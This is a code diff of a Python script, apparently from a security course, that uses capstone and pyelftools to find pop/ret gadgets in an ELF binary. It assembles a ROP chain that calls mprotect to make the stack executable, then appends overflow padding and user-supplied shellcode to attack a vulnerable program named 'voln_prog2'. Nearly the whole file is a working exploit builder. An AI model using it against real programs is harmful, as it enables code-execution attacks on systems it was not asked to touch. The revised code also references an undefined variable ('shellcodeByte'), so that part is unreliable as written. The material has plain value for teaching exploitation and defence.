@@ -5,14 +5,16 @@ from capstone import *
 from elftools.elf.elffile import ELFFile
 from elftools.elf.relocation import RelocationSection
 filename= 'a.out'
-#for modified volun_prog2:
+
+#values for modified voln_prog2:
 '''
 base of binary: 0x555555554000
 address of mprotect: 0x7ffff7affc00
 start of buffer: 0x7fffffffdf90
-start of payload (272 A's included): 0x7fffffffe098
+start of payload (264 A's included): 0x7fffffffe098
 base of stack: 0x7fffffffe0b0
 '''
+
 disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
 
 def zerochecker(bytes, expectedLength):
@@ -31,9 +33,6 @@ with open(filename, 'rb') as file:
             opslist[opslist_index] += b'\xc3'
             opslist_index += 1
 
-        for x in opslist:
-            print(x)
-
         addr = code['sh_addr'] # type int
         md = Cs(CS_ARCH_X86, CS_MODE_64)
 
@@ -48,12 +47,9 @@ with open(filename, 'rb') as file:
                 for (address, size, mnemonic, op_str) in md.disasm_lite(opslist[0], addr):
                     if ((mnemonic ==  "pop") or (mnemonic == "ret")):
                          disas.append((address,mnemonic,op_str))
-                         print("added a gadget, length of gadget list (with duplicates) = " + str(len(disas)))
                 addr += 1
                 opslist[0] = opslist[0][1:]
             opslist = opslist[1:]
-
-print("done with both while loops!")
 
 gadgets = []
 gadgetIndex = 0
@@ -99,6 +95,7 @@ while gadgetIndex < len(gadgets):
 print("Available Gadgets: ")
 for i in gadgets:
         print(i)
+print("Number of unique gadgets: " + str(len(gadgets)))
 
 # now that duplicates are repmoved, remove gadgets with multiple of: rdi, rsi, rdx
 
@@ -120,68 +117,75 @@ for x in range(0, len(gadgets)):
         shortest_rdx = len(gadgets[x])
         rdx_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
 
-print("shortest_rdi = " + str(shortest_rdi))
-print(rdi_addr)
-print("shortest_rsi = " + str(shortest_rsi))
-print(rsi_addr)
-print("shortest_rdx = " + str(shortest_rdx))
-print(rdx_addr)
+print("Length of shortest gadget to pop rdi = " + str(shortest_rdi))
+print("Length of shortest gadget to pop rsi = " + str(shortest_rsi))
+print("Length of shortest gadget to pop rdx = " + str(shortest_rdx))
 
 if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
     sys.exit("Unable to find necessary gadgets to build payload!")
 
-heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
-if heapOrStack == "S":
-        baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
-        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
-        addressOfPayload = input("Input address of start of ROP payload, including leading  \"0x\": ")
-        baseOfStack = input("Input address of the base of the stack, including leading  \"0x\"")
-        shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
-        rdi_addr.reverse()
-        rsi_addr.reverse()
-        rdx_addr.reverse()
+baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\": ")
+addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
+addressOfPayload = input("Input address of start of ROP payload, including leading  \"0x\": ")
+baseOfStack = input("Input address of the base of the stack, including leading  \"0x\": ")
+fileForShellcode = input("Input path of file for shellcode input: ")
+shellcodeFile = open(fileForShellcode,'r')
+shellcodeTemp = shellcodeFile.read()
+print(shellcodeTemp)
+shellcodeBytes = bytes(shellcodeTemp, 'latin1')
+print(shellcodeBytes)
+shellcode = shellcodeByte
+shellcodeFile.close()
 
-        #arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
-        #arg_addr.reverse()
+#shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
 
-        faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
-        faddr_byte_array.reverse()
+faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
+faddr_byte_array.reverse()
 
-        baseOfStack_byte_array = bytearray.fromhex(baseOfStack[2:])
-        baseOfStack_byte_array.reverse()
-
-
-        # check if ROP payload has the gadgets etc to actually be built
-        
-        sizeOfStack = int(addressOfPayload, 16) - int(baseOfStack, 16)
-        sizeOfPayload = 64+8*6*3 + len(shellcode)
-        #start of mprotect = address of payload - size of payload - that mod 4096
-        endOfStack = int(addressOfPayload, 16) - sizeOfPayload
-        startOfMprotect = endOfStack - endOfStack%4096
-        #size of mprotect = size of stack + size of payload + endofstack%4096
-        sizeOfMprotect = sizeOfStack + sizeOfPayload + endOfStack%4096
+baseOfStack_byte_array = bytearray.fromhex(baseOfStack[2:])
+baseOfStack_byte_array.reverse()
 
 
+#calculations for args of mprotect
+sizeOfStack = int(addressOfPayload, 16) - int(baseOfStack, 16)
+sizeOfPayload = 72+8*3 + len(shellcode)
+endOfStack = int(addressOfPayload, 16) - sizeOfPayload
+startOfMprotect = endOfStack - endOfStack%4096
+sizeOfMprotect = sizeOfStack + sizeOfPayload + endOfStack%4096
+sizeOfMprotect += 4096-(sizeOfMprotect%4096)
 
-        # start building ROP payload
-        garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
-        print(hex(startOfMprotect))
-        print(zerochecker(hex(startOfMprotect),18))
-        rdi_arg = bytearray.fromhex(zerochecker(hex(startOfMprotect), 18)[2:])
-        rdi_arg.reverse()
-        rsi_arg = bytearray.fromhex(zerochecker(hex(sizeOfMprotect), 18)[2:])
-        rsi_arg.reverse()
-        rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
-        mprotect_addr = faddr_byte_array
+rdi_addr.reverse()
+rsi_addr.reverse()
+rdx_addr.reverse()
 
-        # gadget addrs need to be calculated from base of binary
+rdi_addr = bytearray.fromhex(hex(int.from_bytes(rdi_addr, 'little') + int(baseOfBinary, 16))[2:])
+rsi_addr = bytearray.fromhex(hex(int.from_bytes(rsi_addr, 'little') + int(baseOfBinary, 16))[2:])
+rdx_addr = bytearray.fromhex(hex(int.from_bytes(rdx_addr, 'little') + int(baseOfBinary, 16))[2:])
 
-        payload = rdi_addr + rdi_arg + garbage * (shortest_rdi - 2)
-        payload += rsi_addr + rsi_arg + garbage * (shortest_rsi - 2)
-        payload += rdx_addr + rdx_arg + garbage * (shortest_rdx - 2)
-        payload += mprotect_addr
-        shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
-        payload += shellcode_addr + b"\x00\x00" + shellcode
-        f = open('payload.txt', 'wb')
-        f.write(payload)
-        f.close()
+rdi_addr.reverse()
+rsi_addr.reverse()
+rdx_addr.reverse()
+
+# start building ROP payload
+garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
+rdi_arg = bytearray.fromhex(zerochecker(hex(startOfMprotect), 18)[2:])
+rdi_arg.reverse()
+rsi_arg = bytearray.fromhex(zerochecker(hex(sizeOfMprotect), 18)[2:])
+rsi_arg.reverse()
+rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
+mprotect_addr = faddr_byte_array
+
+# gadget addrs need to be calculated from base of binary
+
+payload = rdi_addr + b"\x00\x00" + rdi_arg + garbage * (shortest_rdi - 2)
+#print(payload)
+payload += rsi_addr + b"\x00\x00" + rsi_arg + garbage * (shortest_rsi - 2)
+payload += rdx_addr + b"\x00\x00" + rdx_arg + garbage * (shortest_rdx - 2)
+payload += mprotect_addr + b"\x00\x00"
+shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
+shellcode_addr.reverse()
+payload += shellcode_addr + b"\x00\x00" + shellcode
+f = open('payload.txt', 'wb')
+f.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+payload)
+#f.write(payload)
+f.close()
